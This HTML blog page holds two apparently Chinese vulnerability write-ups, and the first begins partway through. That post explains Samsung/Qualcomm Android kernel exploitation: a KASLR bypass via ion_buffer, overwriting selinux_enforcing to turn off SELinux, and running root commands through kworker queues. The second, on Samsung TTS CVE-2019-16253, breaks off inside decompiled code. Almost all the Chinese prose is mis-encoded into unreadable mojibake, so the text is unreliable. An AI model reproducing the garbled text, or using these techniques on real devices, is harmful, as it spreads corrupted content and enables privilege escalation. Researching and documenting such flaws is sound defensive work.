<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶<code>ion_heap</code>åœ¨å†…æ ¸é•œåƒä¸­ä¸æ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œä½†æ¯ä¸ª<code>ion_heap</code>éƒ½åŒ…å«ä¸€ä¸ª<code>ion_heap_ops</code>å­—æ®µï¼Œå®ƒæŒ‡å‘ç‰¹å®š<code>ion_heap</code>å¯¹è±¡çš„ç›¸åº” <code>vtable</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">ion_heap_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„<code>ops</code>å­—æ®µæ˜¯å†…æ ¸é•œåƒä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ã€‚å¦‚æœèƒ½å¤Ÿè¯»å–<code>ion_buffer-&gt;heap-&gt;ops</code>ï¼Œé‚£ä¹ˆä¹Ÿèƒ½å¤Ÿå¾—åˆ°ä¸€ä¸ªåœ°å€æ¥æ‰“è´¥<code>KASLR</code>ï¼Œå°†å†…æ ¸é•œåƒä¸­çš„åœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€ã€‚è¿™å¯ä»¥æŒ‰ä»¥ä¸‹æ–¹æ³•è¿›è¡Œã€‚</p>
<ol>
<li>é¦–å…ˆåœ¨å‡çš„å†…æ ¸å †ä¸­æ‰¾åˆ°<code>ion_buffer</code>ç»“æ„çš„ä½ç½®ã€‚è¿™å¯ä»¥é€šè¿‡<code>ion_buffer</code>ä¸­çš„<code>flags</code>å­—æ®µæ¥å®Œæˆã€‚</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯åœ¨åˆ›å»º<code>ion_buffer</code>æ—¶ä»<code>ION_IOC_ALLOC</code> <code>ioctl</code>çš„å‚æ•°ä¸­ä¼ é€’çš„4ä¸ªå­—èŠ‚çš„å€¼ã€‚å¯ä»¥å°†è¿™äº›è®¾ç½®ä¸ºç‰¹å®šçš„ â€œé­”æ³• â€œå€¼ï¼Œå¹¶åœ¨å‡çš„å†…æ ¸å †ä¸­æœç´¢å®ƒä»¬ã€‚</p>
<ol start="2">
<li>ä¸€æ—¦æ‰¾åˆ°<code>ion_buffer</code>ç»“æ„ï¼Œè¯»å–å…¶å †æŒ‡é’ˆã€‚è¿™å°†æ˜¯å†…æ ¸é•œåƒä¹‹å¤–çš„ä½å†…å­˜åŒºåŸŸçš„ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå› æ­¤ï¼Œå®ƒçš„ç‰©ç†åœ°å€å¯ä»¥é€šè¿‡åº”ç”¨å¸¸æ•°åç§»æ¥è·å¾—ã€‚</li>
<li>ä¸€æ—¦è·å¾—ç›¸åº”çš„<code>ion_heap</code>å¯¹è±¡çš„ç‰©ç†åœ°å€ï¼Œä¿®æ”¹<code>ion_buffer</code>çš„<code>sg_table</code>ï¼Œä½¿å…¶åå¤‡å­˜å‚¨æŒ‡å‘åŒ…å«<code>ion_heap</code>çš„é¡µé¢ã€‚</li>
<li>åœ¨<code>ion_buffer</code>çš„æ–‡ä»¶æè¿°ç¬¦ä¸Šè°ƒç”¨<code>mmap</code>ï¼Œè¿™å°†æŠŠåŒ…å«<code>ion_heap</code>çš„é¡µé¢æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚ç„¶åå¯ä»¥ç›´æ¥ä»ç”¨æˆ·ç©ºé—´è¯»å–è¯¥é¡µä»¥è·å¾—<code>OPS</code>æŒ‡é’ˆï¼Œè¿™å°†æä¾›<code>KASLR</code>çš„åç§»ã€‚</li>
</ol>
<p><code>ion_buffer</code>ç»“æ„çš„ä½¿ç”¨ä¹Ÿè§£å†³äº†å¦ä¸€ä¸ªé—®é¢˜ã€‚è™½ç„¶å‡å†…æ ¸å †å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒå¹¶ä¸å®Œç¾ã€‚æ¯å½“å‡å†…æ ¸å †ä¸­çš„ä¸€ä¸ªå¯¹è±¡è¢«é‡Šæ”¾æ—¶ï¼Œ<code>kfree</code>å°†ä½¿ç”¨<code>PageSlab</code>æ£€æŸ¥æ¥æ£€æŸ¥åŒ…å«è¯¥å¯¹è±¡çš„é¡µé¢æ˜¯å¦æ˜¯æ¥è‡ª<code>SLUB</code>åˆ†é…å™¨çš„å•é¡µ<code>slab</code>ã€‚å¦‚æœæ£€æŸ¥å¤±è´¥ï¼Œé‚£ä¹ˆ<code>PageCompound</code>æ£€æŸ¥å°†è¢«æ‰§è¡Œï¼Œä»¥æ£€æŸ¥è¯¥é¡µæ˜¯å¦æ˜¯ä¸€ä¸ªæ›´å¤§çš„<code>slab</code>çš„ä¸€éƒ¨åˆ†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line"></span><br><span class="line">    trace_kfree(_RET_IP_, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(x)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    page = virt_to_head_page(x);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;     <span class="comment">//&lt;-------- check if the page allocated is a single page slab</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> order = compound_order(page);</span><br><span class="line"></span><br><span class="line">        BUG_ON(!PageCompound(page));     <span class="comment">//&lt;-------- check if the page is allocated as part of a multipage slab</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™äº›æ£€æŸ¥æ˜¯åœ¨åŒ…å«é¡µé¢å…ƒæ•°æ®çš„é¡µé¢ç»“æ„æœ¬èº«ä¸Šè¿›è¡Œçš„ï¼Œå› æ­¤åªè¦æœ‰å¯¹è±¡è¢«é‡Šæ”¾ï¼Œå®ƒä»¬å°±ä¼šå¤±è´¥å¹¶å¯¼è‡´å†…æ ¸å´©æºƒã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨ç°åœ¨æ‹¥æœ‰çš„ä»»æ„è¯»å†™åŸè¯­æ¥è¦†ç›–é¡µé¢ç»“æ„ä¸­å„è‡ªçš„å…ƒæ•°æ®æ¥è§£å†³ï¼ˆå¯¹åº”äºç‰©ç†åœ°å€çš„é¡µé¢ç»“æ„çš„åœ°å€åªæ˜¯ç‰©ç†åœ°å€çš„é€»è¾‘ç§»åŠ¨ï¼Œç„¶åæ˜¯å›ºå®šåç§»é‡çš„è½¬æ¢ï¼Œæ‰€ä»¥å¯ä»¥å°†åŒ…å«é¡µé¢ç»“æ„çš„é¡µé¢æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´å¹¶ä¿®æ”¹å…¶å†…å®¹ï¼‰ã€‚ç„¶è€Œï¼Œå¦‚æœèƒ½å¤Ÿç¡®ä¿å æ®å‡å†…æ ¸å †çš„å¯¹è±¡æ°¸è¿œä¸ä¼šè¢«é‡Šæ”¾ï¼Œé‚£å°±æ›´ç®€å•äº†ã€‚åœ¨<code>ion_buffer</code>ç»“æ„è¢«é‡Šæ”¾ä¹‹å‰ï¼Œä¼šè°ƒç”¨<code>ion_buffer_destroy</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_buffer_destroy</span><span class="params">(<span class="keyword">struct</span> ion_device *dev, <span class="keyword">struct</span> ion_buffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    heap = buffer-&gt;heap;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (heap-&gt;flags &amp; ION_HEAP_FLAG_DEFER_FREE)</span><br><span class="line">        ion_heap_freelist_add(heap, buffer);    <span class="comment">//&lt;--------- does not free immediately</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ion_buffer_release(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>ion_heap</code>åŒ…å«æ ‡å¿—<code>ION_HEAP_FLAG_DEFER_FREE</code>ï¼Œé‚£ä¹ˆ<code>ion_buffer</code>ä¸ä¼šç«‹å³è¢«é‡Šæ”¾ï¼Œè€Œæ˜¯é€šè¿‡<code>ion_heap_freelist_add</code>è¢«æ·»åŠ åˆ°<code>ion_heap</code>çš„<code>free_list</code>ã€‚æ·»åŠ åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­çš„<code>ion_buffer</code>å¯¹è±¡åªæœ‰åœ¨ä»¥åéœ€è¦çš„æ—¶å€™æ‰ä¼šè¢«é‡Šæ”¾ï¼Œè€Œä¸”åªæœ‰åœ¨<code>ION_HEAP_FLAG_DEFER_FREE</code>æ ‡å¿—è¢«è®¾ç½®çš„æƒ…å†µä¸‹ã€‚å½“ç„¶ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œ<code>ION_HEAP_FLAG_DEFER_FREE</code>åœ¨<code>ION_heap</code>çš„ç”Ÿå‘½å‘¨æœŸå†…ä¸ä¼šæ”¹å˜ï¼Œä½†æ˜¯é€šè¿‡æˆ‘ä»¬çš„ä»»æ„å†…å­˜å†™å…¥åŸºå…ƒï¼Œå¯ä»¥ç®€å•åœ°å°†<code>ION_HEAP_FLAG_DEFER_FREE</code>æ·»åŠ åˆ°<code>ION_heap-&gt;flags</code>ä¸­ï¼Œé‡Šæ”¾<code>ION_buffer</code>ï¼Œç„¶åå†æ¬¡ç§»é™¤<code>ION_HEAP_FLAG_DEFER_FREE</code>ï¼Œ<code>ION_buffer</code>å°†åªæ˜¯åœç•™åœ¨<code>ION_heap</code>çš„<code>freelist</code>ä¸­è€Œæ°¸è¿œä¸ä¼šè¢«é‡Šæ”¾ã€‚æ­¤å¤–ï¼ŒåŒ…å«<code>ion_heap</code>å¯¹è±¡çš„é¡µé¢å·²ç»è¢«æ˜ å°„ï¼Œç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡<code>KASLR</code>ï¼Œæ‰€ä»¥åˆ‡æ¢è¯¥æ ‡å¿—æ˜¯ç›¸å½“å¾®ä¸è¶³é“çš„ã€‚é€šè¿‡å–·æ´’å‡çš„å†…æ ¸å †ï¼Œä½¿å…¶å……æ»¡äº†<code>ion_buffer</code>å¯¹è±¡åŠå…¶é™„å±ç‰©ï¼Œå¯ä»¥ç¡®ä¿è¿™äº›å¯¹è±¡æ°¸è¿œä¸ä¼šè¢«é‡Šæ”¾ï¼Œé¿å…å†…æ ¸å´©æºƒã€‚</p>
<h2 id="Bypassing-SELinux"><a href="#Bypassing-SELinux" class="headerlink" title="Bypassing SELinux"></a>Bypassing SELinux</h2><p>å½“<code>SELinux</code>è¢«å¯ç”¨æ—¶ï¼Œå®ƒå¯ä»¥åœ¨ <code>permissive</code> æ¨¡å¼æˆ– <code>enforcing</code> æ¨¡å¼ä¸‹è¿è¡Œã€‚å½“å¤„äº <code>permissive</code> æ¨¡å¼æ—¶ï¼Œå®ƒå°†åªå®¡è®¡å’Œè®°å½•æœªç»æˆæƒçš„è®¿é—®ï¼Œä½†ä¸ä¼šé˜»æ­¢å®ƒä»¬ã€‚<code>SELinux</code>çš„è¿è¡Œæ¨¡å¼æ˜¯ç”±<code>selinux_enforcing</code>å˜é‡æ§åˆ¶çš„ã€‚å¦‚æœè¿™ä¸ªå˜é‡ä¸ºé›¶ï¼Œé‚£ä¹ˆ<code>SELinux</code>å°±ä»¥ <code>permissive</code> æ¨¡å¼è¿è¡Œã€‚é€šå¸¸ï¼Œå¯¹ç³»ç»Ÿå®‰å…¨è‡³å…³é‡è¦çš„å˜é‡ä¼šå—åˆ°ä¸‰æ˜Ÿå†…æ ¸æ•°æ®ä¿æŠ¤ï¼ˆKDPï¼‰çš„ä¿æŠ¤ï¼Œé€šè¿‡ä½¿ç”¨<code>__kdp_ro</code>æˆ–<code>__rkp_ro</code>å±æ€§å°†å…¶æ ‡è®°ä¸ºåªè¯»ã€‚è¿™ä¸ªå±æ€§è¡¨æ˜è¯¥å˜é‡å¤„äºåªè¯»é¡µé¢ï¼Œå…¶ä¿®æ”¹å—åˆ°ç®¡ç†ç¨‹åºè°ƒç”¨çš„ä¿æŠ¤ã€‚ç„¶è€Œï¼Œåœ¨5.xåˆ†æ”¯çš„é«˜é€šå†…æ ¸ä¸­ï¼Œä¸‰æ˜Ÿä¼¼ä¹å¿˜è®°äº†ä¿æŠ¤è¿™ä¸ªå˜é‡ï¼ˆ<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">åˆæ˜¯è¿™æ ·å—</a>ï¼ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In security/selinux/hooks.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> selinux_enforcing_boot;</span><br><span class="line"><span class="type">int</span> selinux_enforcing;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œå¯ä»¥ç›´æ¥å°†<code>selinux_enforcing</code>è¦†ç›–ä¸ºé›¶ï¼Œå¹¶å°†<code>SELinux</code>è®¾ç½®ä¸º<code>permissive</code>æ¨¡å¼ã€‚è™½ç„¶è¿˜æœ‰å…¶ä»–ç»•è¿‡<code>SELinux</code>çš„æ–¹æ³•ï¼ˆæ¯”å¦‚Valentina Palmiottiåœ¨è¿™ä¸ª<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">æ¼æ´</a>ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼‰ï¼Œä½†æ­¤æ—¶çš„æ·å¾„æ›´å—æ¬¢è¿ï¼Œæ‰€ä»¥å°†ç›´æ¥è®¾ç½®<code>selinux_enforcing</code>å˜é‡ã€‚</p>
<h2 id="Running-arbitrary-root-commands-using-ret2kworker-TM"><a href="#Running-arbitrary-root-commands-using-ret2kworker-TM" class="headerlink" title="Running arbitrary root commands using ret2kworker(TM)"></a>Running arbitrary root commands using ret2kworker(TM)</h2><p>åœ¨ä¸‰æ˜Ÿè®¾å¤‡ä¸Šè·å¾—<code>root</code>æƒé™çš„ä¸€ä¸ªä¼—æ‰€å‘¨çŸ¥çš„é—®é¢˜æ˜¯ä¸‰æ˜Ÿçš„<code>RKP</code>ï¼ˆå®æ—¶å†…æ ¸ä¿æŠ¤ï¼‰æ‰€æ–½åŠ çš„ä¿æŠ¤ã€‚åœ¨å®‰å“è®¾å¤‡ä¸Šè·å¾—<code>root</code>æƒé™çš„ä¸€ä¸ªå¸¸è§æ–¹æ³•æ˜¯ç”¨<code>root</code>æƒé™è¦†ç›–æˆ‘ä»¬è‡ªå·±è¿›ç¨‹çš„è¯ä¹¦ã€‚ç„¶è€Œï¼Œä¸‰æ˜Ÿçš„<code>RKP</code>å†™ä¿æŠ¤æ¯ä¸ªè¿›ç¨‹çš„å‡­è¯ï¼Œæ‰€ä»¥è¿™åœ¨è¿™é‡Œæ˜¯ä¸å¯èƒ½çš„ã€‚åœ¨ä½œè€…çš„ä¸Šä¸€æ¬¡<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">åˆ©ç”¨</a>ä¸­ï¼Œèƒ½å¤Ÿä»¥<code>root</code>èº«ä»½æ‰§è¡Œä»»æ„ä»£ç ï¼Œå› ä¸ºæ‰€åˆ©ç”¨çš„ç‰¹å®šUAFå¯¼è‡´ä¸€ä¸ªå—æ§å‡½æ•°æŒ‡é’ˆåœ¨ä»¥<code>root</code>èº«ä»½è¿è¡Œçš„<code>kworker</code>çš„ä»£ç ä¸­è¢«æ‰§è¡Œã€‚</p>
<p>å½“ç„¶ï¼Œé€šè¿‡ä»»æ„çš„å†…å­˜è¯»å†™åŸè¯­ï¼Œå¯ä»¥ç®€å•åœ°å°†å¯¹è±¡æ·»åŠ åˆ°è¿™äº›å·¥ä½œé˜Ÿåˆ—ä¹‹ä¸€ï¼ˆåŸºæœ¬ä¸Šæ˜¯åŒ…å«å·¥ä½œç»“æ„çš„é“¾æ¥åˆ—è¡¨ï¼‰ï¼Œå¹¶ç­‰å¾…ä¸€ä¸ª<code>kworker</code>æ¥æ¥å–å·¥ä½œã€‚äº‹å®è¯æ˜ï¼Œè®¸å¤šè¿™äº›å·¥ä½œé˜Ÿåˆ—ç¡®å®æ˜¯é™æ€çš„å…¨å±€å¯¹è±¡ï¼Œåœ¨å†…æ ¸é•œåƒä¸­å…·æœ‰å›ºå®šçš„åœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffc012c8f7e0 D system_wq</span><br><span class="line">ffffffc012c8f7e8 D system_highpri_wq</span><br><span class="line">ffffffc012c8f7f0 D system_long_wq</span><br><span class="line">ffffffc012c8f7f8 D system_unbound_wq</span><br><span class="line">ffffffc012c8f800 D system_freezable_wq</span><br><span class="line">ffffffc012c8f808 D system_power_efficient_wq</span><br><span class="line">ffffffc012c8f810 D system_freezable_power_efficient_wq</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œå°†æ¡ç›®æ·»åŠ åˆ°è¿™äº›å·¥ä½œé˜Ÿåˆ—ä¸­å¹¶è®©<code>kworker</code>æ¥å¤„ç†è¿™äº›å·¥ä½œæ˜¯æ¯”è¾ƒç›´æ¥çš„ã€‚ç„¶è€Œï¼Œç”±äº<code>kCFI</code>ï¼Œåªèƒ½è°ƒç”¨å…·æœ‰ä»¥ä¸‹ç­¾åçš„å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (func*)(<span class="keyword">struct</span> work_struct *work)</span><br></pre></td></tr></table></figure>

<p>æ˜¯å¦èƒ½æ‰¾åˆ°ä¸€ä¸ªè¶³å¤Ÿå¼ºå¤§çš„å‡½æ•°æ¥è¿è¡Œï¼Ÿç»“æœç›¸å½“ç®€å•ã€‚å‡½æ•°<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/kernel/umh.c#L190"><code>call_usermodehelper_exec_work</code></a>ï¼Œé€šå¸¸åœ¨å†…æ ¸æ¼æ´ä¸­è¢«ç”¨æ¥è¿è¡Œ<code>shell</code>å‘½ä»¤ï¼Œå®ƒç¬¦åˆè¿™ä¸ªè¦æ±‚ï¼Œå¯ä»¥è¿è¡Œæä¾›çš„<code>shell</code>å‘½ä»¤ã€‚å› æ­¤ï¼Œé€šè¿‡ä¿®æ”¹ï¼Œæ¯”å¦‚è¯´ï¼Œ<code>system_unbound_wq</code>ï¼Œå¹¶åœ¨å…¶ä¸­æ·»åŠ ä¸€ä¸ªæŒæœ‰<code>call_usermodehelper_exec_work</code>æŒ‡é’ˆçš„æ¡ç›®ï¼Œå¯ä»¥ç»•è¿‡ä¸‰æ˜Ÿçš„<code>RKP</code>å’Œ<code>kCFI</code>ï¼Œä»¥<code>root</code>èº«ä»½è¿è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<h1 id="å¤ç°æƒ…å†µ"><a href="#å¤ç°æƒ…å†µ" class="headerlink" title="å¤ç°æƒ…å†µ"></a>å¤ç°æƒ…å†µ</h1><p>éœ€è¦<code>Snapdragon 888</code>åŠä»¥ä¸ŠèŠ¯ç‰‡çš„æµ‹è¯•æœºï¼Œç›®å‰æ²¡æœ‰ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a target="_blank" rel="noopener" href="https://github.blog/2022-06-16-the-android-kernel-mitigations-obstacle-race/">The Android kernel mitigations obstacle race</a></p>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html">The More You Know, The More You Know You Donâ€™t Know</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-14T13:03:22.000Z" title="2022/6/14 21:03:22">2022-06-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-16T12:32:45.552Z" title="2022/6/16 20:32:45">2022-06-16</time></span><span class="level-item">8 minutes read (About 1210 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/14/Samsung-TTS-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2019-16253/">Samsung TTS ææƒæ¼æ´(CVE-2019-16253)</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><code>Text-To-Speech</code>å¼•æ“æ˜¯åœ¨<code>Android</code>æ‰‹æœºä¸­é»˜è®¤å¼€å¯çš„ï¼Œä½†æ˜¯å‚å•†åœ¨å®ç°çš„æ—¶å€™å‡ºäº†é—®é¢˜ï¼Œå°±æ˜¯æœ¬ç« çš„<code>CVE-2019-16253</code>ã€‚</p>
<h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><p><code>SamsungTTS</code> before 3.0.02.7&#x2F;3.0.00.101<br>è¡¥ä¸ä¿¡æ¯ï¼š</p>
<ul>
<li>Android N,O or older : 3.0.00.101 </li>
<li>Android P : 3.0.02.7</li>
</ul>
<h1 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h1><p><code>Samsung TTS</code>ä»¥<code>system uid</code>è¿›è¡Œè¿è¡Œï¼Œæä¾›<code>TTS</code>åŠŸèƒ½ï¼Œå› æ­¤æ¼æ´åˆ©ç”¨å¯ä»¥ä»¥<code>system</code>æƒé™è¿”å›ä¸€ä¸ª<code>shell</code>ã€‚</p>
<p><code>com.samsung.SMT.mgr.LangPackMgr$2</code>åŠ¨æ€æ³¨å†Œäº†ä¸€ä¸ª<code>receiver</code>ï¼Œå…¶æ¥æ”¶å¸¦æœ‰<code>com.samsung.SMT.ACTION_INSTALL_FINISHED</code>çš„<code>Intent</code>ã€‚<code>receiver</code>ç›²ç›®çš„ä¿¡ä»»ä¼ å…¥æ•°æ®ä¸­çš„<code>SMT_ENGINE_PATH</code>ï¼Œç»è¿‡ä¸€äº›å¤„ç†ä»¥åï¼Œ<code>LangPackMgr.updateEngine</code>é€šè¿‡è°ƒç”¨<code>com.samsung.SMT.engine.SmtTTS-&gt;reloadEngine</code>ï¼ˆæœ€ç»ˆè°ƒç”¨<code>System-&gt;load</code>ï¼‰åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼ŒåŠ è½½æ‰§è¡Œ<code>SMT_ENGINE_PATH</code>æŒ‡å‘çš„<code>so</code>åº“ï¼Œå¯¼è‡´åœ¨<code>Samsung TTS</code>æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>è¿˜æœ‰ä¸¤ç‚¹ï¼š</p>
<ul>
<li>æ¼æ´ä¸éœ€è¦æ‰‹åŠ¨å¯åŠ¨æ¶æ„<code>APP</code>ï¼Œåªè¦å¯ç”¨äº†<code>Samsung TTS</code>ï¼Œå®ƒç›‘å¬åº”ç”¨ç¨‹åºå®‰è£…å¸è½½ï¼Œå½“å‘ç°æœ‰ä»¥<code>com.samsung.SMT.lang</code>å¼€å¤´çš„åŒ…å®‰è£…æ—¶ï¼Œå°±ä¼šå¯åŠ¨è¯¥åº”ç”¨ç¨‹åºçš„æœåŠ¡ï¼›</li>
<li><code>Samsung TTS</code>å°†åœ¨è®¾å¤‡å¯åŠ¨æ—¶ï¼Œè¿è¡Œæ³¨å†Œçš„åº“ï¼Œå› æ­¤å¯ä»¥å®ç°é™é»˜æŒä¹…åŒ–ã€‚</li>
</ul>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$2</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg10, Intent arg11)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg11.getAction().equals(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>)) &#123;</span><br><span class="line">           <span class="comment">//...</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_1</span> <span class="operator">=</span> arg11.getIntExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, v7);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg11.getStringExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>);  <span class="comment">// 1</span></span><br><span class="line">            <span class="keyword">if</span>(v0_1 &gt; SmtTTS.get().getEngineVersion() &amp;&amp; (CString.isValid(v2))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(CFile.isExist(v2)) &#123;</span><br><span 